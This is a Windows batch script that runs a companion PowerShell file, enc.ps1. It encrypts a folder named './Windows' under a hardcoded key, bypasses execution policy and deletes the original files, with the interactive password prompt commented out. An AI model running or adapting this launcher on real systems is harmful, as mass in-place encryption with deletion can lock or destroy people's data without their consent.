@echo off
setlocal enabledelayedexpansion

rem Define the folder path to encrypt (customize as needed)
set "FOLDER_PATH=./Windows"
set "SCRIPT_PATH=%~dp0enc.ps1"

rem Check if the .ps1 script exists
if not exist "%SCRIPT_PATH%" (
    echo Error: enc.ps1 not found in the same directory as this batch file.
    pause
    exit /b 1
)

rem Check if folder exists
if exist "%FOLDER_PATH%" (
    echo Folder exists: %FOLDER_PATH%
    rem Call the encryption subroutine
    call :enc
) else (
    echo Folder not found: %FOLDER_PATH%
    pause
    exit /b 1
)

rem Pause and wait for Enter key before exiting (replaces timeout)
set /p dummy="Encryption process complete. Press Enter to exit..."
exit /b 0

rem Encryption subroutine: Executes the .ps1 and calls Encrypt-Folder
:enc
echo Starting encryption process...
rem "$pass = Read-Host 'Enter encryption password' -AsSecureString; $plainPass = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass)); & { . '%SCRIPT_PATH%'; Encrypt-Folder -Path '%FOLDER_PATH%' -Password $plainPass -DeleteOriginals }"  --The origana pass promt for normal use
powershell.exe -ExecutionPolicy Bypass -Command ^
    "$plainPass = '6c7a8571-d33c-4901-b20b-f47f4f9e679c||NG4gN6y1uNKTnxwwLTgcw||FINAL'; & { . '%SCRIPT_PATH%'; Encrypt-Folder -Path '%FOLDER_PATH%' -Password $plainPass -DeleteOriginals }"

if %errorlevel% == 0 (
    echo Encryption process completed successfully!
) else (
    echo An error occurred during encryption. Check the output above.
)
pause
exit /b 0